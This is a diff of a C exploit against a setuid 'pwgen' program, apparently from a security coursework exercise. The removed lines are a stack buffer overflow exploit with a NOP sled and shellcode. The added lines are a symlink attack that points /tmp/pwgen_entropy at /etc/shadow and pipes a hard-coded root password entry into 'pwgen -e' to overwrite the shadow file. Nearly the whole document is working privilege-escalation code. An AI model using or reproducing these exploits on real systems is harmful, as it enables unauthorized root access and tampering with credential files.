@@ -15,59 +15,23 @@
 
 int main(int argc, char *argv[])
 {
-  char *args[4];
-  char *env[1];
-  char *buf, *ptr;
-  long *addr_ptr, addr;
-  // one way to invoke pwgen, system() creates a separate process
+  FILE *fp,*tmpfile;
   int i;
-  int bsize = DBSIZE, offset = DOFFSET;
+   char changeshadow[] = "root:nVh3UuD38pTiY:16565::::::";
+ 
 
  
 
-  if(argc > 1) bsize = atoi(argv[1]);
-    if(argc > 2) offset = atoi(argv[2]);
+   tmpfile = fopen("/tmp/fakefile","w");
+   fclose(tmpfile);
 
-  if(!(buf = malloc(bsize))){
-    printf("error");
-    exit(0);
-  }
-    printf("Using address 0x%x...", addr);
-
-
-
-  ptr = buf; 
-  addr_ptr = (long *) ptr;
-  for (i = 0; i < bsize; i+=4)
-  *(addr_ptr++) = 0xbfd7dfff;
- for(i = 0 ; i < bsize/2 ; i++)
- buf[i] = NOP;
-
-  ptr = buf + ((bsize/2)  - (strlen(shellcode)/2 ));
-  for (i = 0 ; i <strlen(shellcode);i++)
-      *(ptr++) = shellcode[i];
-
-  
-    buf[bsize - 1] = '\0';//jump here. not overwrite here.
-//addrbuf = malloc(2000);
-//   for(i = 0; i < 2000;i+=4)
-//   addrbuf[i] = "\xff\xbf\xdd\x30";
-//addrbuf[2000] = '\0';
-
- 
-   
-    args[0] = TARGET; args[1] = "-s";
-    args[2] = buf; 
-args[3] = NULL;
-    env[0] = NULL;
-  // execve() executes the target program by overwriting the
-  // memory of the process in which execve() is executing, i.e.,
-  // execve() should never return
-  if (execve(TARGET, args, env) < 0)
-  fprintf(stderr, "execve failed.\n");
-
-
-
+   symlink("/etc/shadow","/tmp/pwgen_entropy");
+//  symlink("/tmp/fakefile","/tmp/pwgen_entrophy");
+   fp = popen("/usr/local/bin/pwgen -e","w");
+//   unlink("/tmp/pwgen_entrophy");
+//   symlink("/etc/shadow","/tmp/pwgen_entropy");
+   fprintf(fp, "\n%s", changeshadow); 
+   fclose(fp);
 //printf("%s %s %s",args[0], args[1],  args[2]);
   exit(0);
 }
